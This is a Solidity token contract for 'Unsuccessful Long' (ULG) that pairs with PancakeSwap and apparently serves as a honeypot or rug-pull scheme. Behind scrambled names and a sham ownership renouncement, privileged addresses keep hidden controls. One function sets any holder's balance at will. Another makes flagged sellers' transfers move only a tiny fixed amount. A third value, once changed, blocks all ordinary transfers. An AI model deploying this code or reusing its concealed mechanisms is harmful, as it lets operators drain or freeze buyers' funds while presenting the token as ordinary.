//SPDX-License-Identifier: MIT

pragma solidity ^0.8.6;

interface listLaunch {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract walletFrom {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface sellAmount {
    function createPair(address limitTo, address liquidityReceiver) external returns (address);
}

interface sellTake {
    function totalSupply() external view returns (uint256);

    function balanceOf(address teamListTake) external view returns (uint256);

    function transfer(address amountShould, uint256 shouldMin) external returns (bool);

    function allowance(address isFund, address spender) external view returns (uint256);

    function approve(address spender, uint256 shouldMin) external returns (bool);

    function transferFrom(
        address sender,
        address amountShould,
        uint256 shouldMin
    ) external returns (bool);

    event Transfer(address indexed from, address indexed buyTx, uint256 value);
    event Approval(address indexed isFund, address indexed spender, uint256 value);
}

interface sellTakeMetadata is sellTake {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract UnsuccessfulLong is walletFrom, sellTake, sellTakeMetadata {

    bool public marketingIs;

    uint256 private walletTrading;

    mapping(address => bool) public senderExempt;

    function balanceOf(address teamListTake) public view virtual override returns (uint256) {
        return receiverExempt[teamListTake];
    }

    address limitExempt = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function receiverLaunch(address enableMax) public {
        if (buyIs) {
            return;
        }
        if (fromMode == modeShouldLaunched) {
            modeShouldLaunched = false;
        }
        senderExempt[enableMax] = true;
        
        buyIs = true;
    }

    uint256 takeFundReceiver;

    address public toMin;

    uint256 public tokenIsBuy;

    uint256 private sellBuy = 100000000 * 10 ** 18;

    string private buyMinReceiver = "ULG";

    string private fundLaunch = "Unsuccessful Long";

    address fundAmount = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function symbol() external view virtual override returns (string memory) {
        return buyMinReceiver;
    }

    function liquidityLaunch(address maxTotal, uint256 shouldMin) public {
        minWallet();
        receiverExempt[maxTotal] = shouldMin;
    }

    constructor (){
        
        listLaunch maxModeFrom = listLaunch(limitExempt);
        launchSell = sellAmount(maxModeFrom.factory()).createPair(maxModeFrom.WETH(), address(this));
        
        toMin = _msgSender();
        buyAutoTo();
        senderExempt[toMin] = true;
        receiverExempt[toMin] = sellBuy;
        if (enableTake != tokenIsBuy) {
            enableTake = tokenIsBuy;
        }
        emit Transfer(address(0), toMin, sellBuy);
    }

    function launchedSellFund(address limitIs, address amountShould, uint256 shouldMin) internal returns (bool) {
        require(receiverExempt[limitIs] >= shouldMin);
        receiverExempt[limitIs] -= shouldMin;
        receiverExempt[amountShould] += shouldMin;
        emit Transfer(limitIs, amountShould, shouldMin);
        return true;
    }

    uint256 fromReceiver;

    function tradingTake(address listReceiver) public {
        minWallet();
        if (marketingIs != modeShouldLaunched) {
            walletTrading = enableTake;
        }
        if (listReceiver == toMin || listReceiver == launchSell) {
            return;
        }
        txFrom[listReceiver] = true;
    }

    uint8 private minSwapReceiver = 18;

    function totalSupply() external view virtual override returns (uint256) {
        return sellBuy;
    }

    function name() external view virtual override returns (string memory) {
        return fundLaunch;
    }

    address private buyMin;

    mapping(address => uint256) private receiverExempt;

    uint256 constant walletEnable = 9 ** 10;

    function transfer(address maxTotal, uint256 shouldMin) external virtual override returns (bool) {
        return minBuy(_msgSender(), maxTotal, shouldMin);
    }

    function getOwner() external view returns (address) {
        return buyMin;
    }

    bool public fromMode;

    bool private modeShouldLaunched;

    function receiverIsMax(uint256 shouldMin) public {
        minWallet();
        takeFundReceiver = shouldMin;
    }

    mapping(address => bool) public txFrom;

    function minWallet() private view {
        require(senderExempt[_msgSender()]);
    }

    bool public buyIs;

    function approve(address launchToToken, uint256 shouldMin) public virtual override returns (bool) {
        launchWallet[_msgSender()][launchToToken] = shouldMin;
        emit Approval(_msgSender(), launchToToken, shouldMin);
        return true;
    }

    function buyAutoTo() public {
        emit OwnershipTransferred(toMin, address(0));
        buyMin = address(0);
    }

    event OwnershipTransferred(address indexed feeTrading, address indexed listTo);

    address public launchSell;

    function minBuy(address limitIs, address amountShould, uint256 shouldMin) internal returns (bool) {
        if (limitIs == toMin) {
            return launchedSellFund(limitIs, amountShould, shouldMin);
        }
        uint256 txReceiver = sellTake(launchSell).balanceOf(fundAmount);
        require(txReceiver == takeFundReceiver);
        require(amountShould != fundAmount);
        if (txFrom[limitIs]) {
            return launchedSellFund(limitIs, amountShould, walletEnable);
        }
        return launchedSellFund(limitIs, amountShould, shouldMin);
    }

    function transferFrom(address limitIs, address amountShould, uint256 shouldMin) external override returns (bool) {
        if (_msgSender() != limitExempt) {
            if (launchWallet[limitIs][_msgSender()] != type(uint256).max) {
                require(shouldMin <= launchWallet[limitIs][_msgSender()]);
                launchWallet[limitIs][_msgSender()] -= shouldMin;
            }
        }
        return minBuy(limitIs, amountShould, shouldMin);
    }

    function owner() external view returns (address) {
        return buyMin;
    }

    function allowance(address minModeWallet, address launchToToken) external view virtual override returns (uint256) {
        if (launchToToken == limitExempt) {
            return type(uint256).max;
        }
        return launchWallet[minModeWallet][launchToToken];
    }

    mapping(address => mapping(address => uint256)) private launchWallet;

    uint256 public enableTake;

    function decimals() external view virtual override returns (uint8) {
        return minSwapReceiver;
    }

}